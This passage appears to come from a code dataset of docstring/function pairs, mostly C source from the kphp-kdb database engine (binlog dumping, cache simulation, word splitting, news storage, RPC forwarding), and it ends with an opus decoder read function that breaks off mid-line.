LEV_ROTATE_TO:\n    fprintf(out, \"lev_rotate_to\\t%d\\t%lld\\t%llu\\t%llu\\n\",\n      ((struct lev_rotate_to*) EE)->timestamp /* %d:int */,\n      ((struct lev_rotate_to*) EE)->next_log_pos /* %lld:long long */,\n      ((struct lev_rotate_to*) EE)->cur_log_hash /* %llu:hash_t */,\n      ((struct lev_rotate_to*) EE)->next_log_hash /* %llu:hash_t */);\n    return 0;\n  case LEV_LI_SET_ENTRY ... LEV_LI_SET_ENTRY+0xff:\n    dump_new_entry(out, \"lev_li_set_entry\", E->type-LEV_LI_SET_ENTRY, ((struct lev_new_entry*) EE));\n    return 0;\n  case LEV_LI_ADD_ENTRY ... LEV_LI_ADD_ENTRY+0xff:\n    dump_new_entry(out, \"lev_li_add_entry\", E->type-LEV_LI_ADD_ENTRY, ((struct lev_new_entry*) EE));\n    return 0;\n  case LEV_LI_REPLACE_ENTRY ... LEV_LI_REPLACE_ENTRY+0xff:\n    dump_new_entry(out, \"lev_li_replace_entry\",E->type-LEV_LI_REPLACE_ENTRY, ((struct lev_new_entry*) EE));\n    return 0;\n  case LEV_LI_SET_ENTRY_EXT ... LEV_LI_SET_ENTRY_EXT+0xff:\n    dump_new_entry_ext(out, \"lev_li_set_entry_ext\", E->type-LEV_LI_SET_ENTRY_EXT,((struct lev_new_entry_ext*) EE));\n    return 0;\n  case LEV_LI_ADD_ENTRY_EXT ... LEV_LI_ADD_ENTRY_EXT+0xff:\n    dump_new_entry_ext(out, \"lev_li_add_entry_ext\", E->type-LEV_LI_ADD_ENTRY_EXT, ((struct lev_new_entry_ext*) EE));\n    return 0;\n  case LEV_LI_SET_ENTRY_TEXT ... LEV_LI_SET_ENTRY_TEXT+0xff:\n    fprintf(out, \"lev_set_entry_text\\t\");\n    dump_list_id(out, ((struct lev_set_entry_text*) EE)->list_id);\n    fputc('\\t', out);\n    dump_object_id(out, ((struct lev_set_entry_text*) EE)->object_id);\n    fputc('\\t', out);\n    dump_str(out, ((struct lev_set_entry_text*) EE)->text, E->type & 0xff);\n    fputc('\\n', out);\n    return 0;  \n  case LEV_LI_SET_FLAGS ... LEV_LI_SET_FLAGS+0xff:\n    dump_set_flags(out, \"lev_li_set_flags\", E->type - LEV_LI_SET_FLAGS, ((struct lev_set_flags*) EE)); \n    return 0;\n  case LEV_LI_INCR_FLAGS ... LEV_LI_INCR_FLAGS+0xff:\n    dump_set_flags(out, \"lev_li_incr_flags\", E->type - LEV_LI_INCR_FLAGS, ((struct lev_set_flags*) EE)); \n    return 0;\n  case LEV_LI_DECR_FLAGS ... LEV_LI_DECR_FLAGS+0xff:\n    dump_set_flags(out, \"lev_li_decr_flags\", E->type - LEV_LI_DECR_FLAGS, ((struct lev_set_flags*) EE)); \n    return 0;\n  case LEV_LI_SET_FLAGS_LONG:\n    fprintf(out, \"lev_set_flags_long\\t\");\n    dump_list_id(out,((struct lev_set_flags_long*) EE)->list_id);\n    fputc('\\t', out);\n    dump_object_id(out,((struct lev_set_flags_long*) EE)->object_id);\n    fprintf(out,\"\\t%d\\n\", ((struct lev_set_flags_long*) EE)->flags);\n    return 0;\n  case LEV_LI_CHANGE_FLAGS_LONG:\n    fprintf(out, \"lev_change_flags_long\\t\");\n    dump_list_id(out,((struct lev_change_flags_long*) EE)->list_id);\n    fputc('\\t', out);\n    dump_object_id(out,((struct lev_change_flags_long*) EE)->object_id);\n    fprintf(out, \"\\t%d\\t%d\\n\", \n      ((struct lev_change_flags_long*) EE)->and_mask /* %d:int */,\n      ((struct lev_change_flags_long*) EE)->xor_mask /* %d:int */);\n    return 0;\n  case LEV_LI_SET_VALUE:\n    dump_set_value(out, \"lev_set_value\", ((struct lev_set_value*) EE));\n    return 0;\n  case LEV_LI_INCR_VALUE:\n    dump_set_value(out, \"lev_incr_value\", ((struct lev_set_value*) EE));\n    return 0;\n  case LEV_LI_INCR_VALUE_TINY ... LEV_LI_INCR_VALUE_TINY + 0xff:\n    fprintf(out, \"lev_li_incr_value_tiny+%d\\t\", E->type - LEV_LI_INCR_VALUE_TINY);\n    dump_list_id(out,((struct lev_del_entry*) EE)->list_id);\n    fputc('\\t', out);\n    dump_object_id(out,((struct lev_del_entry*) EE)->object_id);\n    fputc('\\n', out);\n    return 0;\n  case LEV_LI_DEL_LIST:\n    fprintf(out, \"lev_del_list\\t\");\n    dump_list_id(out,((struct lev_del_list*) EE)->list_id);\n    fputc('\\n', out);\n    return 0;\n  case LEV_LI_DEL_OBJ:\n    fprintf(out, \"lev_li_del_obj\\t\");\n    dump_object_id(out,((struct lev_del_obj*) EE)->object_id);\n    fputc('\\n', out);\n    return 0;\n  case LEV_LI_DEL_ENTRY:\n    fprintf(out, \"lev_del_entry\\t\");\n    dump_list_id(out,((struct lev_del_entry*) EE)->list_id);\n    fputc('\\t', out);\n    dump_object_id(out,((struct lev_del_entry*) EE)->object_id);\n    fputc('\\n', out);\n    return 0;\n  case LEV_LI_SUBLIST_FLAGS:\n    fprintf(out, \"lev_sublist_flags\\t\");\n    dump_list_id(out,((struct lev_sublist_flags*) EE)->list_id);\n    fprintf(out, \"\\t%d\\t%d\\t%d\\t%d\\n\",\n      (int)((struct lev_sublist_flags*) EE)->xor_cond /* %d:unsigned char */,\n      (int)((struct lev_sublist_flags*) EE)->and_cond /* %d:unsigned char */,\n      (int)((struct lev_sublist_flags*) EE)->and_set /* %d:unsigned char */,\n      (int)((struct lev_sublist_flags*) EE)->xor_set /* %d:unsigned char */);\n    return 0;\n  case LEV_LI_DEL_SUBLIST:\n    fprintf(out, \"lev_del_sublist\\t\");\n    dump_list_id(out, ((struct lev_del_sublist*) EE)->list_id);\n    fprintf(out,\"\\t%d\\t%d\\t\",\n      (int)((struct lev_del_sublist*) EE)->xor_cond /* %d:unsigned char */,\n      (int)((struct lev_del_sublist*) EE)->and_cond /* %d:unsigned char */);\n    dump_unsigned_char_list(out, ((struct lev_del_sublist*) EE)->reserved, 2);\n    fputc('\\n', out);  \n    return 0;\n  default:\n    return -1;\n  }\n}", "path": "kphp-kdb/lists/lists-binlog.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/*\n[-v] [-u<username>] [-t<seconds-ago>] [-U<min-utime>..<max-utime>] <old-binlog-file> [<output-binlog-file>]\\n\"\n     \"If <output-binlog-file> is specified, resulting binlog is appended to it.\\n\"\n     \"\\t-h\\tthis help screen\\n\"\n     \"\\t-v\\tverbose mode on\\n\"\n     \"\\t-t\\tcutoff time relative to present moment\\n\"\n     \"\\t-U\\tcopies all binlog except delete entries with timestamps in given range\\n\"\n     \"\\t-i\\tdo not import timestamps\\n\"\n     \"\\t-u<username>\\tassume identity of given user\\n\",\n*/\n", "func_signal": "void usage (void)", "code": "{\n  fprintf (stderr, \"usage:\\t%s <binlog-file>\\n\"\n                   \"\\tConverts lists binlog into text format.\\n\"\n                   \"\\tflags:\\n\"\n                   \"\\t-t<min_utime,max_utime>\\tset dumping range, unix times should separated by single comma\\n\"\n                   \"\\t-r<seconds-ago>\\n\"\n                   \"\\t-a\\tdump timestamp in human readable format\\n\"\n   ,progname);\n}", "path": "kphp-kdb/lists/lists-binlog.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/*\nTODO: LEV_LI_SET_ENTRY_TEXT\n*/\n", "func_signal": "int main (int argc, char *argv[])", "code": "{\n  int i,x,y;\n//  long long jump_log_pos = 0;\n  out = stdout;\n  while ((i = getopt (argc, argv, \"ahvr:t:u:J:\")) != -1) {\n    switch (i) {\n    case 'a':\n      human_readable_timestamp = 1;\n      break;\n    case 'v':\n      verbosity++;\n      break;\n    case 'h':\n      usage();\n      return 2;\n    case 'u':\n      username = optarg;\n      break;\n    case 'r':\n      if (1 == sscanf(optarg, \"%d\", &x)) {\n        min_utime = time(0) - x;\n      }\n      break;\n    case 't':\n      if (2 == sscanf(optarg, \"%d,%d\", &x, &y)) {\n        min_utime = x;\n        max_utime = y;\n      }\n      break;\n    case 'J':\n      assert (sscanf (optarg, \"%lld:%u:%d\", &jump_log_pos, &jump_log_crc32, &jump_log_ts) == 3);\n      break;\n    }\n  }\n\n  if (optind >= argc) {\n    usage();\n    return 2;\n  }\n  if (verbosity >= 3) {\n  #ifdef\tLISTS_Z \n    fprintf(stderr, \"#defined LISTS_Z\\n\");\n  #elif defined(LISTS64)\n    fprintf(stderr, \"#defined LISTS64\\n\");\n  #else\n    fprintf(stderr, \"not defined LISTS64 and not define LISTS_Z\\n\");\n  #endif  \n  }\n  if (verbosity) {\n    fprintf(stderr, \"dumping time range [%d, %d]\\n\", min_utime, max_utime);  \n  }\n  if (min_utime > max_utime) {\n    fprintf(stderr, \"min_utime > max_utime\\n\");\n    return 1;\n  }\n\n  //src_fname = argv[optind];\n\n  if (username && change_user(username) < 0) {\n    fprintf (stderr, \"fatal: cannot change user to %s\\n\", username ? username : \"(none)\");\n    return 1;\n  }\n  \n\n  replay_logevent = lists_replay_logevent;\n  \n  if (engine_preload_filelist ( argv[optind], binlogname) < 0) {\n    fprintf (stderr, \"cannot open binlog files for %s\\n\", binlogname ? binlogname : argv[optind]);\n    exit (1);\n  }\n\n  if (verbosity>=3){\n    fprintf (stderr, \"engine_preload_filelist done\\n\");\n  }\n\n  Binlog = open_binlog (engine_replica, jump_log_pos);\n  if (!Binlog) {\n    fprintf (stderr, \"fatal: cannot find binlog for %s, log position %lld\\n\", engine_replica->replica_prefix, jump_log_pos);\n    exit (1);\n  }\n\n  binlogname = Binlog->info->filename;\n\n  if (verbosity) {\n    fprintf (stderr, \"replaying binlog file %s (size %lld)\\n\", binlogname, Binlog->info->file_size);\n  }\n  binlog_load_time = -mytime();\n  clear_log();\n  init_log_data (jump_log_pos, jump_log_ts, jump_log_crc32);\n  if (verbosity) {\n    fprintf (stderr, \"replay log events started\\n\");\n  }\n\n  i = replay_log (0, 1);\n \n  if (verbosity) {\n    fprintf (stderr, \"replay log events finished\\n\");\n  }\n\n  binlog_load_time += mytime();\n  binlog_loaded_size = log_readto_pos - jump_log_pos;\n\n  if (verbosity) {\n    fprintf(stderr, \"Processed %llu events.\\n\", lists_replay_logevent_calls);\n    fprintf(stderr, \"min timestamp = %d, max timestamp = %d\\n\", min_timestamp, max_timestamp);\n  }\n\n  /*\n  src_fd = open (src_fname, O_RDONLY);\n  if (src_fd < 0) {\n    fprintf (stderr, \"cannot open %s: %m\\n\", src_fname);\n    return 1;\n  }\n\n  while (process_record() >= 0) { }\n\n  flush_out();\n\n  if (targ_fd != 1) {\n    if (fdatasync(targ_fd) < 0) {\n      fprintf (stderr, \"error syncing %s: %m\", targ_fname);\n      exit (1);\n    }\n    close (targ_fd);\n  }\n  if (verbosity > 0) {\n    output_stats();\n  }\n  */\n\n // return rend > rptr ? 1 : 0;\n  return 0;\n\n}", "path": "kphp-kdb/lists/lists-binlog.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/* ------ dumping funcions --------- */\n", "func_signal": "void dump_int_list(FILE* f, int *s, int len)", "code": "{\n  int i;\n  //fputc('{', f);  \n  for(i=0;i<len;++i) {\n    if (i > 0) fputc(':', f);\n    //fprintf(f, \"%d\",(int) ((unsigned char) s[i]));\n    fprintf(f, \"%d\", s[i]);\n  } \n  //fputc('}', f);\n}", "path": "kphp-kdb/lists/lists-binlog.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/********** some binlog functions ***********/\n", "func_signal": "void start_binlog (int schema_id, char *str)", "code": "{\n  int len = str ? strlen(str)+1 : 0;\n  int extra = (len + 3) & -4;\n  if (len == 1) { extra = len = 0; }\n  struct lev_start *E = write_alloc (sizeof(struct lev_start) - 4 + extra);\n  E->type = LEV_START;\n  E->schema_id = schema_id;\n  E->extra_bytes = extra;\n  E->split_mod = split_mod;\n  E->split_min = split_rem;\n  E->split_max = split_rem + 1;\n  if (len) {\n    memcpy (E->str, str, len);\n  }\n}", "path": "kphp-kdb/lists/lists-import-dump.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "//static int heap_cached_all_uries = 1, heap_uncached_all_uries = 1;\n", "func_signal": "static void cache_priority_lists_request (void)", "code": "{\n  vkprintf (3, \"<%d> cache_priority_list_request\\n\", next_priority_lists_request_time);\n  double t = -get_rusage_time ();\n  int cached_limit = 0, uncached_limit = 0;\n  if (simulation_params.optimization) {\n    cached_limit = 2 * simulation_stats.max_erased_files_between_two_priority_requests;\n    if (cached_limit > CACHE_MAX_HEAP_SIZE) {\n      cached_limit = CACHE_MAX_HEAP_SIZE;\n    }\n    uncached_limit = 2 * simulation_stats.max_retrieved_files_between_two_priority_requests;\n    if (uncached_limit > CACHE_MAX_HEAP_SIZE) {\n      uncached_limit = CACHE_MAX_HEAP_SIZE;\n    }\n  }\n\n  if (!cached_limit) {\n    cached_limit = CACHE_MAX_HEAP_SIZE;\n  }\n  if (!uncached_limit) {\n    uncached_limit = CACHE_MAX_HEAP_SIZE;\n  }\n\n  cache_get_priority_heaps (&heap_cached, &heap_uncached, cached_limit, uncached_limit, &heap_cached_files, &heap_uncached_files);\n  vkprintf (2, \"heap_cached_files: %d, heap_uncached_files: %d\\n\", heap_cached_files, heap_uncached_files);\n\n  //heap_cached_all_uries = heap_cached_files < cached_limit;\n  //heap_uncached_all_uries = heap_uncached_files < uncached_limit;\n\n  t += get_rusage_time ();\n  if (simulation_stats.max_priority_lists_request_time < t) {\n    simulation_stats.max_priority_lists_request_time = t;\n  }\n  cached_ptr = 1;\n  uncached_ptr = 0;\n  next_download_file_time = next_priority_lists_request_time;\n  next_priority_lists_request_time += simulation_params.delay_between_priority_lists_requests;\n  simulation_stats.priority_lists_requests++;\n}", "path": "kphp-kdb/cache/cache-simulator.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/* text->word->hash parser */\n", "func_signal": "void init_is_letter (void)", "code": "{\n  int i;\n\n  memset (is_letter, 32, sizeof (is_letter));\n  is_letter[0] = 0;\n\n  for (i = 'A'; i <= 'Z'; i++) is_letter[i] = i + 32;\n  for (i = 'a'; i <= 'z'; i++) is_letter[i] = i;\n  is_letter[0xa8] = is_letter[0xb8] = 0xe5;\n  for (i = 0xc0; i <= 0xdf; i++) is_letter[i] = i + 32;\n  for (i = 0xe0; i <= 0xff; i++) is_letter[i] = i;\n}", "path": "kphp-kdb/msg-search/msg-search-engine.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/**\n * Writing engine stats\n */\n", "func_signal": "void st_try_change_user (void)", "code": "{\n  if (change_user (username) < 0) {\n    fprintf (stderr, \"fatal: cannot change user to %s\\n\", username ? username : \"(default)\");\n    exit (1);\n  }\n  if (verbosity >= 2) {\n    fprintf (stderr, \"User changed to %s\\n\", username ? username : \"(default)\");\n  }\n}", "path": "kphp-kdb/skat/st-utils.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/*\nstruct gather_methods sum_tuple_userlist_gather_methods = {\n  .on_start = sum_tuple_on_start,\n  .on_send = sum_tuple_userlist_on_send,,\n  .on_error = sum_tuple_on_error,\n  .on_answer = sum_tuple_on_answer,\n  .on_timeout = 0,\n  .on_end = sum_tuple_on_end,\n  .on_send_end = 0\n};*/\n", "func_signal": "int targ_forward (void)", "code": "{\n  Q_userlist = 0;\n  int op = tl_fetch_lookup_int ();\n  assert (op);\n  //struct gather_methods m;\n  switch (op) {\n  case TL_TARG_AD_ENABLE:\n  case TL_TARG_AD_ENABLE_PRICE:\n  case TL_TARG_AD_DISABLE:\n  case TL_TARG_AD_SET_CTR:\n  case TL_TARG_AD_SET_SUMP:\n  case TL_TARG_AD_SET_CTR_SUMP:\n  case TL_TARG_AD_SET_AUD:\n  case TL_TARG_AD_LIMITED_VIEWS:\n  case TL_TARG_AD_VIEWS_RATE_LIMIT:\n  case TL_TARG_AD_SITES:\n  case TL_TARG_AD_SET_FACTOR:\n  case TL_TARG_AD_SET_DOMAIN:\n  case TL_TARG_AD_SET_CATEGORIES:\n  case TL_TARG_AD_SET_GROUP:\n  case TL_TARG_DELETE_GROUP:\n    merge_forward (&diagonal_gather_methods);\n    return 0;\n  case TL_TARG_AD_CLICKS:\n  case TL_TARG_AD_MONEY:\n  case TL_TARG_AD_VIEWS:\n  case TL_TARG_AD_RECENT_VIEWS:\n  case TL_TARG_TARGET:\n    merge_forward (&sum_one_gather_methods);\n    return 0;\n  case TL_TARG_AD_CTR:\n  case TL_TARG_AD_SUMP:\n  case TL_TARG_AD_CTR_SUMP:\n    merge_forward (&sum_tuple_gather_methods);\n    return 0;\n  case TL_TARG_RECENT_VIEWS_STATS:\n  case TL_TARG_RECENT_AD_VIEWERS:\n    merge_forward (&sum_vector_gather_methods);\n    return 0;\n  case TL_TARG_SEARCH:\n    merge_forward (&sum_search_gather_methods);\n    return 0;\n  case TL_TARG_AD_INFO:\n    return default_random_forward ();\n  case TL_TARG_PRICES:\n  case TL_TARG_AD_PRICING:\n  case TL_TARG_TARG_AUDIENCE:\n  case TL_TARG_AUDIENCE:\n    //merge_forward (&sum_tuple_userlist_gather_methods);\n    merge_forward (&sum_tuple_gather_methods);\n    return 0;\n  default:\n    return default_firstint_forward ();\n  }\n/*    m = sum_one_gather_methods;\n    m.on_send = user_list_on_send;\n    merge_forward (&m);*/\n}", "path": "kphp-kdb/targ/rpc-proxy-targ.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/* returns number removed items */\n", "func_signal": "static int remove_old_items (user_t *U)", "code": "{\n  assert (UG_MODE);\n  int x = U->tot_items, y;\n  if (!x) {\n    return 0;\n  }\n  y = now - (max_news_days + 1) * 86400;\n\n  item_t *p = U->last, *q;\n  const int old_tot_items = x;\n  while (p != (item_t *) U && (x > MAX_USER_ITEMS || p->date <= y)) {\n    q = p->prev;\n    free_item (p);\n    x--;\n    p = q;\n  }\n  U->last = p;\n  p->next = (item_t *) U;\n  U->tot_items = x;\n  assert (U->tot_items >= 0);\n  return old_tot_items - x;\n}", "path": "kphp-kdb/news/news-data.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/* adding new log entries */\n", "func_signal": "int do_delete_user (int user_id)", "code": "{\n  if (conv_uid (user_id) < 0) {\n    return -1;\n  }\n  alloc_log_event (LEV_NEWS_USERDEL, 8, user_id);\n  return delete_user (user_id);\n}", "path": "kphp-kdb/news/news-data.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/* ------ compute struct sizes -------- */\n//int *CB=0;\n", "func_signal": "static void compute_struct_sizes (void)", "code": "{\n  assert (list_id_ints > 0 && list_id_ints <= MAX_LIST_ID_INTS);\n  assert (object_id_ints > 0 && object_id_ints <= MAX_OBJECT_ID_INTS);\n  // compute binlog record sizes\n  \n  // compute memory structure sizes\n\n  #ifdef LISTS_Z\n  int i;\n  object_list_ints = object_id_ints + list_id_ints;\n  ltree_node_size = sizeof (ltree_t) + object_list_ints * 4;\n  object_id_bytes = object_id_ints * 4;\n  list_id_bytes = list_id_ints * 4;\n  object_list_bytes = object_id_bytes + list_id_bytes;\n  list_struct_size = sizeof (list_t) + list_id_bytes;\n  payload_offset = tree_ext_small_node_size = __builtin_offsetof (tree_ext_small_t, x) + object_id_bytes;\n\n  for (i = 0; i < object_id_ints; i++) {\n    max_object_id[i] = MAXINT;\n  }\n  for (i = 0; i < list_id_ints; i++) {\n    max_list_id[i] = MAXINT;\n  }\n  for (i = 0; i < object_id_ints + list_id_ints; i++) {\n    max_list_object_pair[i] = MAXINT;\n  }\n  #ifdef _LP64 \n  if (payload_offset & 4) {\n    payload_offset += 4;\n  }\n  #endif\n  tree_ext_global_node_size = __builtin_offsetof (tree_ext_global_t, z) + object_id_bytes;\n  tree_ext_large_node_size = payload_offset + sizeof (struct tree_payload);\n\n\n  file_list_index_entry_size = sizeof (struct file_list_index_entry) + list_id_bytes;\n  #endif\n\n  // compute offsets for data access\n  /*\n  cyclic_buffer_entry_size = sizeof (struct cyclic_buffer_entry) + list_id_bytes;\n  cyclic_buffer_entry_ints = (cyclic_buffer_entry_size >> 2);\n  \n  assert (!CB);\n  CB = malloc (CYCLIC_BUFFER_SIZE * cyclic_buffer_entry_size);\n  assert (CB);\n  */\n\n}", "path": "kphp-kdb/lists/lists-binlog.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/* use_aio = -1 means \"don't use aio even if a pending aio request exists\" */\n", "func_signal": "int load_metafile (int pos, int use_aio)", "code": "{\n  assert (0 <= pos && pos < large_users_number);\n\n  if (use_aio < 0 && large_metafiles[pos].data && large_metafiles[pos].aio) {\n    if (verbosity >= 0) {\n      fprintf (stderr, \"forced re-loading of pending aio query for large metafile %d without aio\\n\", pos);\n    }\n    // --- MEMORY LEAK for case if aio is really active ---\n    // we don't free buffer so that aio might finish loading data, then it will fail in onload_metafile(), but no data corruption will occur\n    // metafile_free (large_metafiles[pos].data, sizeof (long long) * (large_users[pos + 1].offset - large_users[pos].offset));\n    large_metafiles[pos].data = 0;\n    large_metafiles[pos].aio = 0;\n  }\n\n  if (large_metafiles[pos].data) {\n    if (large_metafiles[pos].aio) {\n      load_metafile_aio (pos);\n      metafiles_cache_loading ++;\n      if (!large_metafiles[pos].aio) {\n        return 1;\n      } else {\n        return -2;\n      }\n    }\n    if (use_aio > 0) {\n      metafiles_cache_ok ++;\n    }\n    return 1;\n  }\n\n  assert (!large_metafiles[pos].aio);\n\n  long long len = sizeof (long long) * (large_users[pos + 1].offset - large_users[pos].offset);\n  while (allocated_metafiles_size + len > max_allocated_metafiles_size && free_by_LRU ());\n  while (!(large_metafiles[pos].data = metafile_alloc (len))) {\n    assert (free_by_LRU ());\n  }\n\n  if (use_aio <= 0) {\n    //fprintf (stderr, \"%lld - %lu\\n\", index_large_data_offset + sizeof (long long) * (long long)large_users[pos].offset, sizeof (long long) * (large_users[pos + 1].offset - large_users[pos].offset));\n    lseek (idx_fd, index_large_data_offset + sizeof (long long) * (long long)large_users[pos].offset, SEEK_SET);\n    assert ((long long)(read (idx_fd, large_metafiles[pos].data, len)) == len);\n    add_use (pos);\n    metafiles_loaded ++;\n    return 1;\n  } else {\n    load_metafile_aio (pos);\n    metafiles_cache_miss ++;\n    return -2;\n  }\n  return 0;\n}", "path": "kphp-kdb/news/news-data.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "// returns length of word (in bytes) starting from pointer str\n// get_word(): \"word\" = at most 127 alphanumeric characters, including at most 4 digits\n// entities like \"&#225;\" or \"&aacute;\" are considered alphanumeric, but counted as several characters\n// get_notword(): \"not-a-word\" = at most 4 non-alphanumeric entities (\"&lt;\" or \"<br/>\" is one entity), at most 31 bytes\n", "func_signal": "int get_word (const char *str)", "code": "{\n  if (word_split_utf8) {\n    return get_word_utf8 (str);\n  }\n  static int inside_star = 0;\n  int b = 0, d = 0;\n  int c = (unsigned char) *str;\n  if (is_letter[c] & 0x40) {\n    if (c == '*') {\n      inside_star = 1;\n    }\n    int z = sigil_word_detect (c, str + 1);\n    if (c == '*') {\n      inside_star = 0;\n    }\n    if (z >= 0 && z < 127) {\n      return z + 1;\n    }\n  }\n  while (b <= 120) {\n    c = (unsigned char) *str;\n    if (is_letter[c] & 8) {\n      str++;\n      if (++b == 127) {\n\tbreak;\n      }\n    } else if (is_letter[c] & 4) {\n      if (d == (inside_star ? 30 : 4)) {\n\tbreak;\n      }\n      str++;\n      d++;\n      b++;\n    } else if (c == '&') {\n      if (str[1] == '#') {\n\tint x, v = 0;\n\tfor (x = 2; x <= 7 && str[x] <= '9' && str[x] >= '0'; x++) {\n\t  v *= 10;\n\t  v += str[x] - '0';\n\t}\n\tif (str[x] == ';' && v && v < 4096) {\n\t  x++;\n          if (!b && v < 128 && (is_letter[v] & 0x40)) {\n            int z = sigil_word_detect (v, str + x);\n            if (z >= 0 && z < 120) {\n              return z + x;\n            }\n          }\n      \t  if (v >= 0xc0 && v <= 0xff && v != 0xd7 && v != 0xf7) {\n      \t    str += x;\n      \t    b += x;\n      \t    continue;\n      \t  }\n\t}\n      }\t\n      break;\n    } else {\n      break;\n    }\n  }\n  return b;\n}", "path": "kphp-kdb/common/word-split.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "// result of read_in will always be a string with length of len\n// __data must have size at least (len + 1)\n", "func_signal": "inline void st_safe_read_in (netbuffer_t *H, char *__data, int len)", "code": "{\n  assert (read_in (H, __data, len) == len);\n  int i;\n  for (i = 0; i < len; i++) {\n    if (__data[i] == 0) {\n      __data[i] = ' ';\n    }\n  }\n  __data[len] = 0;\n}", "path": "kphp-kdb/skat/st-utils.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/*\n * END MAIN\n */\n", "func_signal": "void output_stats (void)", "code": "{\n  fprintf (stderr,\n\t   \"read: %lld bytes, %d records read, %d processed\\n\"\n\t   \"written: %lld bytes\\n\"\n\t   \"temp data: %ld bytes allocated, %d+%d in read/write maps\\n\",\n\t   rd_bytes, line_no, adj_rec, wr_bytes, (long)(GS - GC), Gc, Gd\n\t  );\n}", "path": "kphp-kdb/lists/lists-import-dump.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/* replay log */\n", "func_signal": "static int pmemcached_le_start (struct lev_start *E)", "code": "{\n  if (E->schema_id != PMEMCACHED_SCHEMA_V1) {\n    return -1;\n  }\n  log_split_min = E->split_min;\n  log_split_max = E->split_max;\n  log_split_mod = E->split_mod;\n  assert (log_split_mod > 0 && log_split_min >= 0 && log_split_min + 1 ==  log_split_max && log_split_max <= log_split_mod);\n\n  return 0;\n}", "path": "kphp-kdb/pmemcached/pmemcached-binlog.c", "commit_date": "2014-03-04 00:00:00", "repo_name": "vk-com/kphp-kdb", "stars": 6155, "license": "gpl-2.0", "language": "c", "size": 4301}
{"docstring": "/*\n * -n\n *     indicates error\n * 0\n *     indicates EOF\n * n\n *     indicates actual number of bytes read\n */\n", "func_signal": "static int opus_read(struct input_plugin_data *ip_data, char *buffer, int count)", "code": "{\n\tstruct opus_private *priv;\n\tint samples, current_link, rc;\n\n\tpriv = ip_data->private;\n\n\t/* samples = number of samples read per channel */\n\tsamples = op_read_stereo(priv->of, (void*)buffer,\n\t\t\t\t\t\t\t count / sizeof(opus_int16));\n\tif (samples < 0) {\n\t\tswitch (samples) {\n\t\tcase OP_HOLE:\n\t\t\terrno = EAGAIN;\n\t\t\trc = -1;\n\t\t\tbreak;\n\t\tcase OP_EREAD:\n\t\t\terrno = EINVAL;\n\t\t\trc = -1;\n\t\t\tbreak;\n\t\tcase OP_EFAULT:\n\t\t\terrno = EINVAL;\n\t\t\trc = -1;\n\t\t\tbreak;\n\t\tcase OP_EIMPL:\n\t\t\trc = -IP_ERROR_FUNCTION_NOT_SUPPORTED;\n\t\t\tbreak;\n\t\tcase OP_EINVAL:\n\t\t\terrno = EINVAL;\n\t\t\trc = -1;\n\t\t\tbreak;\n\t\tcase OP_ENOTFORMAT:\n\t\t\trc = -IP_ERROR_FILE_FORMAT;\n\t\t\tbreak;\n\t\tcase OP_EBADHEADER:\n\t\t\trc = -IP_ERROR_FILE_FORMAT;\n\t\t\tbreak;\n\t\tcase OP_EVERSION:\n\t\t\trc = -IP_ERROR_FILE_FORMAT;\n\t\t\tbreak;\n\t\tcase OP_EBADPACKET:\n\t\t\terrno = EINVAL;\n\t\t\trc = -1;\n\t\t\tbreak;\n\t\tcase OP_EBADLINK:\n\t\t\terrno = EINVAL;\n\t\t\trc = -1;\n\t\t\tbreak;\n\t\tcase OP_EBADTIMESTAMP:\n\t\t\trc = -IP_ERROR_FILE_FORMAT;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\td_print(\"error: %d\\n\", samples);\n\t\t\trc = -IP_ERROR_FILE_FORMAT;\n\t\t}\n\t} else if (samples == 0) {\n\t\t/* EOF or buffer too small */\n\t\trc = 0;\n\t} else {\n\t\tcurrent_link = op_current_link(priv->of);\n\t\tif (current_link < 0) {\n\t\t\td_print(\"error: %d\\n\", current_link);\n\t\t\trc = -1;\n\t\t} else {\n\t\t\tif (ip_data->remote && current_link != priv->current_link) {\n\t\t\t\tip_data->metadata_changed = 1;\n\t\t\t\tpriv->current_link = current_link;\n\t\t\t}\n\n\t\t\t/* bytes = samples * channels * sample_size */\n\t\t\trc 